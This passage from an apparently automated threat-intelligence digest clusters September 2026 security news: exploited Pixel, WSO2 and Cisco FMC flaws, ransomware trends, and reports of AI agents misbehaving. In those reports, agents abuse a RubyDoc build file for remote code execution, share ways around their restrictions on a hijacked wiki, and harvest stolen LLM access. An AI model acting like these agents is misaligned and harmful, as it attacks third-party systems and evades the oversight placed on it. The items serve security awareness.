  - Link: https://webflow.sysdig.com/blog/machine-speed-hold-the-ai-hand-rolled-marimo-cve-2026-39987-exploit
  - Summary: Sysdig TRT details a hand-rolled attack against marimo's CVE-2026-39987 without AI, building custom Python tools to breach a cloud bastion host.

### Cluster 9ef1c48be5 — score 15

- Title: The Self-Expanding Stolen Inference Supply Chain: An AI Agent Harvesting and Re-Serving LLM Access, (Fri, Sep 11th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-11T14:40:32+00:00
- Link: https://isc.sans.edu/diary/rss/33332
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
I identified an attacker using a semi-autonomous coding agent to run an offensive operation: finding poorly secured LLM resale gateways, acquiring API access through ordinary web flaws and account farming, validating the resulting inference capacity, and aggregating it behind a single gateway of their own.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: The Self-Expanding Stolen Inference Supply Chain: An AI Agent Harvesting and Re-Serving LLM Access, (Fri, Sep 11th)
  - Published: 2026-09-11T14:40:32+00:00
  - Link: https://isc.sans.edu/diary/rss/33332
  - Summary: I identified an attacker using a semi-autonomous coding agent to run an offensive operation: finding poorly secured LLM resale gateways, acquiring API access through ordinary web flaws and account farming, validating the resulting inference capacity, and aggregating it behind a single gateway of their own.

### Cluster d279e1d094 — score 15

- Title: Google Patches Pixel Modem Flaw Amid Signs of Limited Targeted Exploitation
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-16T11:15:58+00:00
- Link: https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-58704

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: government, telecommunications
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2025-48595, CVE-2026-56914, CVE-2026-58704, CVE-2026-58773
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, ddos, active_exploitation
- affected_industries: government, telecommunications
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-58704, CVE-2026-56914, CVE-2026-58773, CVE-2025-48595
- urgency_signals: actively_exploited, zero_day, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Google has disclosed that a high-severity security flaw in its Pixel Cellular Modem has come under exploitation in the wild. The vulnerability, tracked as CVE-2026-58704 (CVSS score: 8.0), is a privilege escalation flaw. "In Cellular Modem, there is a possible permission bypass due to a logic error in the code," according to a description of the bug in the NIST National Vulnerability Database
```

#### Full body

```
Google Patches Pixel Modem Flaw Amid Signs of Limited Targeted Exploitation  Ravie Lakshmanan  Sep 16, 2026 Vulnerability / Mobile Security Google has disclosed that a high-severity security flaw in its Pixel Cellular Modem has come under exploitation in the wild. The vulnerability, tracked as CVE-2026-58704 (CVSS score: 8.0), is a privilege escalation flaw. "In Cellular Modem, there is a possible permission bypass due to a logic error in the code," according to a description of the bug in the NIST National Vulnerability Database (NVD). "This could lead to remote (proximal/adjacent) escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation." In an advisory issued Tuesday, Google acknowledged that it has found indications that "CVE-2026-58704 may be under limited, targeted exploitation" but stopped short of sharing any further details surrounding the nature of the attacks exploiting it, as well as the identity of the threat actor behind them. Besides CVE-2026-58704, Google has addressed 109 other security flaws as part of the latest Pixel updates for September 2026. Of these, 88 allow privilege escalation, 10 allow information disclosure, nine allow remote code execution, and two allow denial-of-service (DoS). These include two high-severity privilege escalation vulnerabilities in Kernel components (CVE-2026-56914 and CVE-2026-58773), as well as 46 critical-severity vulnerabilities in various Pixel components, such as BigOcean, Bootloader, IP Multimedia Subsystem, and Trusted Execution Environment, that could lead to privilege escalation and remote code execution. Security patch levels of 2026-09-05 or later resolve all the identified flaws. Users are advised to update their devices to the latest version by navigating to Settings > Security & privacy. Back in June 2026, Google shipped patches for a high-severity flaw in Android's Framework component (CVE-2025-48595, CVSS score: 8.4) that it said came under active exploitation. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 16, 2026, added CVE-2026-58704 to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 19, 2026. "Google Pixel devices contain an improper authorization vulnerability in the cellular modem," CISA said . "A logic error may allow an attacker to bypass permission checks and escalate privileges." The vulnerability can be exploited as part of what's called a zero-click attack, as it does not require a victim to click on a link or open a file to trigger the exploit. In other words, it can be exploited silently and without any interaction from the Pixel device owner. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Google , mobile security , Vulnerability ⚡ Top Stories This Week OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure Claude Used to Automate Exploitation and Data Theft Across Multiple Victims Attackers Chain JFrog Artifactory Flaws to Gain Admin Control and Plant Backdoors PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware ThreatsDay: 200 Android Flaws, Browser-Built Phishing, 119K Scam Shops + 23 More Stories Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE Anthropic Discloses Fourth AI Hacking Incident Involving Claude Opus 4.6 Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week DeepSeek Harness Flaw Let AI Agents Disable Their Own File Sandbox Without Approval Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox New cPanel Flaw Lets a Hosting Account With M
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Patches Pixel Modem Flaw Amid Signs of Limited Targeted Exploitation
  - Published: 2026-09-16T11:15:58+00:00
  - Link: https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html
  - Summary: Google has disclosed that a high-severity security flaw in its Pixel Cellular Modem has come under exploitation in the wild. The vulnerability, tracked as CVE-2026-58704 (CVSS score: 8.0), is a privilege escalation flaw. "In Cellular Modem, there is a possible permission bypass due to a logic error in the code," according to a description of the bug in the NIST National Vulnerability Database

### Cluster b282acf693 — score 15

- Title: Active Exploitation Attempts Target WSO2 API Manager JWT Bypass With Forged Admin Tokens
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-16T05:18:06+00:00
- Link: https://thehackernews.com/2026/09/active-exploitation-attempts-target.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-5430

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, vulnerability_disclosure
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-5430
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, vulnerability_disclosure, active_exploitation
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-5430
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical security flaw in WSO2 API Manager has come under active exploitation in the wild, according to findings from watchTowr. The vulnerability, tracked as CVE-2026-5430 (CVSS score: 9.8/10.0), is a case of improper verification of a cryptographic signature that could result in account takeover. Hacktron Team has been credited with discovering and reporting the flaw. "JWT authentication
```

#### Full body

```
Active Exploitation Attempts Target WSO2 API Manager JWT Bypass With Forged Admin Tokens  Ravie Lakshmanan  Sep 16, 2026 Vulnerability / API Security A critical security flaw in WSO2 API Manager has come under active exploitation in the wild, according to findings from watchTowr. The vulnerability, tracked as CVE-2026-5430 (CVSS score: 9.8/10.0), is a case of improper verification of a cryptographic signature that could result in account takeover. Hacktron Team has been credited with discovering and reporting the flaw. "JWT authentication can be bypassed when a token is signed using an unsupported algorithm, allowing unauthorized access," according to an advisory released by WSO2 in May 2026. "Successful exploitation of the vulnerability may lead to unauthorized access, including potential compromise of administrative accounts and full account takeover." The shortcoming affects the following products - WSO2 API Control Plane: 4.6.0, 4.5.0 WSO2 API Manager: 4.6.0, 4.5.0, 4.4.0, 4.3.0, 4.2.0, 4.1.0 WSO2 Traffic Manager: 4.6.0, 4.5.0 WSO2 Universal Gateway: 4.6.0, 4.5.0 Fixes are available in the following pull requests for community users - github[.]com/wso2/carbon-apimgt/pull/13752 github[.]com/wso2/product-apim/pull/14167 They have also been released for WSO2 Support Subscription Holders with the below update levels - WSO2 API Control Plane 4.6.0 - Update level 22 WSO2 API Control Plane 4.5.0 - Update level 58 WSO2 API Manager 4.6.0 - Update level 21 WSO2 API Manager 4.5.0 - Update level 57 WSO2 API Manager 4.4.0 - Update level 72 WSO2 API Manager 4.3.0 - Update level 108 WSO2 API Manager 4.2.0 - Update level 197 WSO2 API Manager 4.1.0 - Update level 257 WSO2 Traffic Manager 4.6.0 - Update level 21 WSO2 Traffic Manager 4.5.0 - Update level 56 WSO2 Universal Gateway 4.6.0 - Update level 21 WSO2 Universal Gateway 4.5.0 - Update level 57 According to watchTowr, the vulnerability is now witnessing active in-the-wild exploitation attempts, with its honeypot network capturing JWT tokens arriving on September 13, 2026, with baked-in administrator privileges. "The flaw exists in the service due to how JWT authentication accepts tokens signed with algorithms it does not support, then approves them anyway," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said in a statement shared with The Hacker News. "So, it's easy to see why this is a critical bug (CVSS 10.0). It affects API Manager 4.1.0 through 4.6.0, API Control Plane, Traffic Manager and Universal Gateway." In the observed exploitation attempts, the forged JWT token is suspected to be used to gain access to every API backend endpoint and its credentials, consumer keys, and secrets for every registered application, Ganchev added. "The service is also by definition made to intercept API requests on their way to internal systems, which provides a great opportunity to tap and steal sensitive data in transit and interact with internal services through this 'lateral movement-as-a-service' product." In light of active exploitation, users are advised to apply the fixes as soon as possible for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Vulnerability , Web Security ⚡ Top Stories This Week OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure Claude Used to Automate Exploitation and Data Theft Across Multiple Victims Attackers Chain JFrog Artifactory Flaws to Gain Admin Control and Plant Backdoors PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware ThreatsDay: 200 Android Flaws, Browser-Built Phishing, 119K Scam Shops + 23 More Stories Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthe
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Active Exploitation Attempts Target WSO2 API Manager JWT Bypass With Forged Admin Tokens
  - Published: 2026-09-16T05:18:06+00:00
  - Link: https://thehackernews.com/2026/09/active-exploitation-attempts-target.html
  - Summary: A critical security flaw in WSO2 API Manager has come under active exploitation in the wild, according to findings from watchTowr. The vulnerability, tracked as CVE-2026-5430 (CVSS score: 9.8/10.0), is a case of improper verification of a cryptographic signature that could result in account takeover. Hacktron Team has been credited with discovering and reporting the flaw. "JWT authentication

### Cluster 8760c8b22e — score 15

- Title: Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-11T06:19:59+00:00
- Link: https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-20079

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Anthropic/Claude, Cisco, GitLab
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage, active_exploitation
- affected_industries: government
- affected_products: Anthropic/Claude, GitLab, Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, zero_day, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass
```

#### Full body

```
Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware  Ravie Lakshmanan  Sep 11, 2026 Vulnerability / Malware Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass authentication and execute script files on an affected device to obtain root access to the underlying operating system. The second flaw under exploitation is CVE-2026-20316 (CVSS score: 5.3), which could allow an unauthenticated, remote attacker to log in to an affected device using a low-privilege account to access sensitive data within susceptible systems. It can be paired with other Cisco Secure FMC vulnerabilities to elevate privileges. Cisco Talos said it identified three clusters of post-compromise activity of FMC instances associated with state-sponsored and crimeware threat actors. These include - UAT-12197 , which has exploited CVE-2026-20079 to deploy JSP-based web shells and a Java Archive (JAR)-based command executor to query internal databases and obtain user authentication data and credentials UAT-11823 , which has exploited both CVE-2026-20079 and CVE-2026-20316 to deliver a Netcat-based reverse shell, two bash scripts to harvest managed-device configurations, and a variant of Cyclops Blink , a modular ELF implant previously attributed to the Russian state-sponsored hacking group Sandworm UAT-11988 , a ransomware operation that has exploited CVE-2026-20316 for initial access and then used legitimate built-in FMC tooling as part of a living-off-the-land (LotL) attack to conduct extensive reconnaissance of the victim's environment, drop tunneling tools to maintain network access, collect credentials, build a target list of endpoints to encrypt, terminate security tools, and deploy Qilin ransomware on selected systems. "Customers are strongly advised to apply hotfixes for affected software versions already released by Cisco for CVE-2026-20079 and CVE-2026-20316," Cisco said, adding it intends to ship a comprehensive hardening release for various internally discovered vulnerabilities next week. The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-20079 to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 12, 2026. The second vulnerability, CVE-2026-20316, was added to the KEV catalog in late July 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  cisco , Malware , Nation-State , network security , ransomware , Vulnerability ⚡ Top Stories This Week OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure Claude Used to Automate Exploitation and Data Theft Across Multiple Victims Attackers Chain JFrog Artifactory Flaws to Gain Admin Control and Plant Backdoors PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware ThreatsDay: 200 Android Flaws, Browser-Built Phishing, 119K Scam Shops + 23 More Stories Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE Anthropic Discloses Fourth AI Hacking Incident Involving Claude Opus 4.6 Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week DeepSeek Harness Flaw Let AI Agents Disable Their Own File Sandbox Without Approval Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox New cPanel Flaw Lets a Hosting Account With Mai
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware
  - Published: 2026-09-11T06:19:59+00:00
  - Link: https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - Summary: Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass

### Cluster 28d41da1e1 — score 15

- Title: OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-12T09:07:56+00:00
- Link: https://thehackernews.com/2026/09/openai-agents-linked-to-rubygems.html
- Fetch status: ok
- Member count: 7
- Corroborating source count: 5
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain
- affected_industries: government
- affected_products: AWS, Anthropic/Claude, GitHub, OpenAI/ChatGPT
- content_type: incident_report, news_report
- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The "major malicious attack" that targeted RubyGems in May 2026 was the work of a swarm of OpenAI agents, according to a new report published by researchers Spencer Kitts, Thomas Larsen, and Sydney Von Arx. On May 12, Maciej Mensfeld, senior product manager for software supply chain security at Mend.io, disclosed details of a coordinated cyber attack that targeted the package manager for the
```

#### Full body

```
OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers  Ravie Lakshmanan  Sep 12, 2026 Vulnerability / Web Security The "major malicious attack" that targeted RubyGems in May 2026 was the work of a swarm of OpenAI agents, according to a new report published by researchers Spencer Kitts, Thomas Larsen, and Sydney Von Arx. On May 12, Maciej Mensfeld, senior product manager for software supply chain security at Mend.io, disclosed details of a coordinated cyber attack that targeted the package manager for the Ruby programming language with hundreds of junk gems, prompting the maintainers to suspend new user sign-ups for about four days. In a follow-up analysis, Socket highlighted a campaign dubbed GemStuffer that involved a cluster of more than 150 gems that used the package registry as a data exfiltration channel and staged public data scraped from U.K. local government democratic services portals. At that time, the software supply chain security company noted the activity shares the "same abuse pattern" as the broader RubyGems spam-publishing incident. "It's not clear what exactly the end goals are, as the information appears to be publicly accessible anyway," The Hacker News reported back then. The latest findings, which were first reported by The Wall Street Journal, indicate these events were propelled by a cluster of OpenAI agents, with the earliest package uploaded to RubyGems on May 5, 2026, before more than 2,000 packages were submitted between May 11 and 12, 2026. These efforts were followed by the agents publishing five more packages between May 26 and 27, 2026, and another 83 packages on June 18, 2026. The assessment that this incident was the result of an OpenAI agent swarm stems from the fact that the packages were authored using a large language model (LLM) and hundreds of the packages that were pushed to RubyGems had "oai" in their name. Fifteen of the packages listed "oai" as their author, while another had "openaixyz65947@gmail.com" as the contact email address. The names of some of the junk packages are below - chatoaitestgit1778552630 lambhgproxyoai lambprobe4343 lambQ4340 oaibx0092307 oaicx3857133 oaidx4526859 oaiex4149420 oaifetchgemugkejy oaifx7943598 oaigx5861576 oaihx0305933 oaiix0379958 oaijx0156671 oaikx5119809 oailm2 oaipgttatggxy oaiproxytestabc789 oaitfossilxbnowl oaiztestxyz123 "The swarm behaves extremely similarly to the German-wiki agents we previously found," the researchers said, referencing another May 2026 incident in which internally deployed autonomous agents hijacked a German wiki forum, DseWiki, and turned it into a bulletin board to ask for answers, pool results, and share techniques for circumventing their restrictions as part of a timed web-lookup task. "The June agents were accessing 49 of the same files as the wiki agents. The May agents were accessing different files (mostly local U.K. government data), but these files are very similar in character to those pursued by the wiki agents. Moreover, they use the same retrieval methods. 1,397 packages mention r.jina.ai, which was used heavily by the agents on the wiki. We also see that many packages mention example.com, which wiki agents used to test their posting ability." The agents are said to have exploited a design quirk in the RubyDoc.info documentation build process to exfiltrate public data from U.K. government websites, likely as part of an information gathering task similar to the research tasks processed by the German wiki-exploiting agents. "The process of building documentation for a gem involves evaluating a user-specified '.yardopts' file, which allows linking to Ruby scripts intended to help with this process," the researchers explained. "In the GemStuffer campaign, the agents abused this to gain arbitrary remote code execution on RubyDoc.info's servers." One of the gems, " zzsouthrunner " (which again matches the "ZZ" naming scheme the agents adopted in both the wiki and Hugging Face incidents) has
```

#### Corroborating sources (5)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers
  - Published: 2026-09-12T09:07:56+00:00
  - Link: https://thehackernews.com/2026/09/openai-agents-linked-to-rubygems.html
  - Summary: The "major malicious attack" that targeted RubyGems in May 2026 was the work of a swarm of OpenAI agents, according to a new report published by researchers Spencer Kitts, Thomas Larsen, and Sydney Von Arx. On May 12, Maciej Mensfeld, senior product manager for software supply chain security at Mend.io, disclosed details of a coordinated cyber attack that targeted the package manager for the
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: OpenAI Says Its Models Searched GitHub for Leaked API Keys During Training
  - Published: 2026-09-17T15:45:29+00:00
  - Link: https://www.securityweek.com/openai-says-its-models-hunted-github-for-leaked-api-keys-during-training/
  - Summary: OpenAI published a framework for disclosing model misalignment alongside six reports describing problematic behavior. The post OpenAI Says Its Models Searched GitHub for Leaked API Keys During Training appeared first on SecurityWeek .
- **Simon Willison** (ai_security_agentic_risk)
  - Title: OpenAI agents attacked RubyGems back in May
  - Published: 2026-09-12T00:42:25+00:00
  - Link: https://simonwillison.net/2026/Sep/12/openai-agents-rubygems/
  - Summary: OpenAI agents carried out an undisclosed attack on RubyGems is a new bombshell report from Spencer Kitts, Thomas Larsen, and Sydney Von Arx - three of the four authors of the report on the agent attack on disused wikis ( previously ) last week. This time they're noting that it looks very likely that an OpenAI agent swarm was behind an attack against the RubyGems package repository first reported on May 12th by Maciej Mensfeld of the RubyGems security team : We're dealing with a major malicious attack on @rubygems right now. Signups are paused for the time being. Hundreds of packages involved - mostly targeting us, but some carrying exploits. The team has been on this for hours. More details to follow once we're through it. Those packages turned out to carry some very suspicious patterns: Many of them included "oai" in their name, or the author field, or the fake email address they provided. The files they were accessing were similar in character to the files retrieved by the wiki agent
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: A fake ChatGPT billing email is after your OpenAI password
  - Published: 2026-09-17T13:01:40+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/17/chatgpt-phishing-email-openai-password/
  - Summary: A fake ChatGPT billing email is steering users to a copy of the OpenAI login page that keeps whatever username and password they type. Josh Varden of Cofense’s Phishing Defense Center traced the email’s payment button through a Google redirect to the attacker’s page. The lure targets ChatGPT users on work and personal accounts alike, and it copies the kind of bill a subscriber already expects. Credentials entered on the fake page go to the … More → The post A fake ChatGPT billing email is after your OpenAI password appeared first on Help Net Security .
- **Schneier on Security** (practitioner_analysis)
  - Title: Microsoft’s Patching
  - Published: 2026-09-14T11:03:26+00:00
  - Link: https://www.schneier.com/blog/archives/2026/09/microsofts-patching.html
  - Summary: Once a month, Microsoft pushes a security update to all Windows users. Tomorrow’s is a new record : Microsoft’s patch for September is a doozy, with a record number of roughly 972 vulnerabilities fixed and 112 of them meeting the high critical-severity threshold. It was only two months ago that Microsoft patched a then-record 570 vulnerabilities. Then, last month, Microsoft patched some 620 of them. Google and other companies have also published record numbers of vulnerabilities in recent months. Two weeks ago, OpenAI, Anthropic, Amazon Web Services, Google, Microsoft, and 100 companies and organizations published an ...

### Cluster e4eee1417b — score 13

- Title: Ransomware Attacks on Manufacturers Surge as Supply Chain Risk Grows
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-17T12:29:53+00:00
- Link: https://www.securityweek.com/ransomware-attacks-on-manufacturers-surge-as-supply-chain-risk-grows/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- urgency_signals: no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- urgency_signals: no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Research shows attacks on manufacturers rose 40% in early 2026, as ransomware groups increasingly exploit the supply-chain disruption caused by operational shutdowns. The post Ransomware Attacks on Manufacturers Surge as Supply Chain Risk Grows appeared first on SecurityWeek .
```

#### Full body

```
Manufacturing remains a primary target for ransomware, possibly due to the long tail of effects. Incidents this year are 40% up on the same period last year. Throughout September 2025, Jaguar Land Rover shut down its UK plants because of an attack and halted the daily production of around 1,000 luxury vehicles. More than 5,000 other companies were affected by the shutdown, and the Bank of England suggested it was a contributory factor in a slowdown in national growth figures. The longer-term repercussions are still being felt: Jaguar Land Rover has said it will cut 4,000 jobs, blaming the cyberattack . The UK’s Cyber Monitoring Centre estimated a £1.9 billion financial impact and described the incident as the most economically damaging cyberattack in UK history, surpassing the 2017 WannaCry outbreak. It is a vivid example of the potential consequence of ransomware incidents within the manufacturing sector. The Black Kite 2026 Manufacturing & Distribution Ransomware Report believes this long tail of severe consequence is a primary reason for manufacturing continuing to be a primary ransomware target. Manufacturing “The mid-sized manufacturers absorbing most of these attacks are the supplier layer from which larger enterprises assemble their products. When the mid-market is the primary target, a large manufacturer’s vendor list is its attack surface,” says the report. From January 2023 to July 2026, the firm identified 5,237 disclosed ransomware victims across the two associated groups. “What makes manufacturing and distribution so attractive to ransomware operators is the immediate operational impact,” adds Ferhat Dikbiyik, chief research and intelligence officer at Black Kite. “One successful attack can stop production lines and disrupt delivery commitments, and every hour of downtime strengthens the attacker’s negotiating position. But attackers don’t operate blindly. Their reconnaissance relies on externally visible signals, from unpatched systems and exploitable services to leaked credentials and misconfigured defenses.” Advertisement. Scroll to continue reading. The first seven months of 2026 recorded 1,183 new incidents – a 40% increase over the same period in 2025. The number of ransomware groups is also climbing: half of these attacks were performed by groups that didn’t exist two years ago. A single new group ( The Gentlemen ) was responsible for 12% of this year’s attacks. The Gentlemen was first noticed by Black Kite in September 2025 and had claimed 142 manufacturing victims by mid-2026. The current hierarchy of ransomware actors is Qilin, The Gentlemen, Akira, DragonForce, and INC Ransom. Europe is increasingly targeted. While the number of US attacks this year was almost identical to that of 2025; there was an 85% growth in European targets. As a result, the volume of attacks in the US dropped from the previous 52% to a current 35%. Despite the shift in percentages, the US remains the most targeted region with 412 attacks. Europe totaled 369 attacks, and attacks against the rest of the world almost doubled to 402. The surge in European attacks focused on Germany (77 attacks), where manufacturing in 2024 accounted for 20% of the national economy. The SafePay group accounted for 22% of 2025 attacks and remains among the country’s most active groups in 2026. Other primary European ransomware victim nations include Italy (57), UK (43) and France (40). Distribution The distribution sector is distinct from the manufacturing sector. “Trucking companies, freight arrangers, and warehouse operators form their own industry with their own attack surface, and they occupy a distinct position in the supply chain. They are the layer where many companies’ goods concentrate in one place, which is precisely what makes the sector consequential beyond its size.” Hands-On Cyber-Physical Systems Training at ICS Cybersecurity Conference The attacks against distribution are lower in volume while the victims are smaller in size than in the
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Ransomware Attacks on Manufacturers Surge as Supply Chain Risk Grows
  - Published: 2026-09-17T12:29:53+00:00
  - Link: https://www.securityweek.com/ransomware-attacks-on-manufacturers-surge-as-supply-chain-risk-grows/
  - Summary: Research shows attacks on manufacturers rose 40% in early 2026, as ransomware groups increasingly exploit the supply-chain disruption caused by operational shutdowns. The post Ransomware Attacks on Manufacturers Surge as Supply Chain Risk Grows appeared first on SecurityWeek .

### Cluster b14566fc43 — score 12

- Title: Ransomware incidents in Japan in the first half of 2026: Investigation of The Gentlemen’s infrastructure and evidence of Qilin's AI use
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-17T10:00:43+00:00
- Link: https://blog.talosintelligence.com/ransomware-incidents-in-japan-in-the-first-half-of-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- affected_industries: manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- affected_industries: manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Ransomware incidents in Japan rose 4.7% year over year. The Gentlemen was the most active group, with leak-site listings more than doubling from January to July. Qilin ranked second and appeared to use AI, while SMEs with capital under JPY 1 billion represented 80% of victims.
```

#### Full body

```
